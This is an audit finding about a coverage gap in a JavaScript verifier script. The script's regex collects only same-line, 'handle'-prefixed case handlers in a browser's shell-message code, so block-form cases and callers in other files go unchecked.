**Verifier (CONFIRMED, low).** verify-shell-request-kinds.mjs:149 collects handlers only through /case\s+"[^"]+"\s*:[^\n]*?return\s+(handle[A-Za-z]+)\s*\(/. The handler call must be on the same line as the case label, and the name must start with 'handle'. The only match today is PowerBrowserAPI.sys.mjs:2332 (handleOrcaShellMessage). Every other case is a block that does its work inline. The check fails as a broken instrument only when no handler is found (:150-152), and line 2332 keeps that from happening. The self-test plant at :419 adds a second caller only for the handler already found (routed.handler), so it never tests a block-form case or a handler with another name. A new block-form case that returns into pairNowHandler would therefore not be collected, and that handler's other callers would never be scanned. The scan also covers only BOUNDARY_REL (:155), so a caller in another file is outside its reach in any form. For an actor file to call the handler, the handler would have to be exported. The precondition is a developer change, so this is hardening. *Checked at:* scripts/verify-shell-request-kinds.mjs:149-163 (matcher and call-site scan), :419 (the only sender-wall plant, against the handler already derived); powerbrowser/shell/PowerBrowserAPI.sys.mjs:2332 (the single line that keeps handlers non-empty), :2333-2404 (block-form cases)

